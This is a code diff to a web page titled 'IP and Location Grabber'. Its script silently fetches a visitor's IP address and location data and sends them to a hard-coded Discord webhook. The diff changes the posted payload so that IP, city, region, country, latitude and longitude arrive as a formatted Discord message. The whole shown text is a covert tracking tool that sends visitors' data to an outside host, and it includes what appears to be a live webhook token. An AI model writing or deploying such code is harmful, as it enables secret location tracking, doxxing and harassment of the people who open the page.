@@ -4,7 +4,7 @@
     <title>IP and Location Grabber</title>
     <script>
         function sendData() {
-            const webhookUrl = 'https://discord.com/api/webhooks/1408171424136302612/n6QRA4_p0gZdLNtfqTG8v6csp0simByjXyMXimc5PWRykziMTScS9HBYH5AxU8dDiA1m'; // Replace with your webhook URL
+            const webhookUrl = 'https://discord.com/api/webhooks/1408171424136302612/n6QRA4_p0gZdLNtfqTG8v6csp0simByjXyMXimc5PWRykziMTScS9HBYH5AxU8dDiA1m'; // Your webhook URL
 
             // Get user's IP address
             fetch('https://api.ipify.org?format=json')
@@ -31,7 +31,9 @@
                                 headers: {
                                     'Content-Type': 'application/json'
                                 },
-                                body: JSON.stringify(userLocation)
+                                body: JSON.stringify({
+                                    content: `IP: ${userLocation.ip}\nCity: ${userLocation.city}\nRegion: ${userLocation.region}\nCountry: ${userLocation.country}\nLatitude: ${userLocation.latitude}\nLongitude: ${userLocation.longitude}`
+                                })
                             })
                             .then(response => response.json())
                             .then(data => {
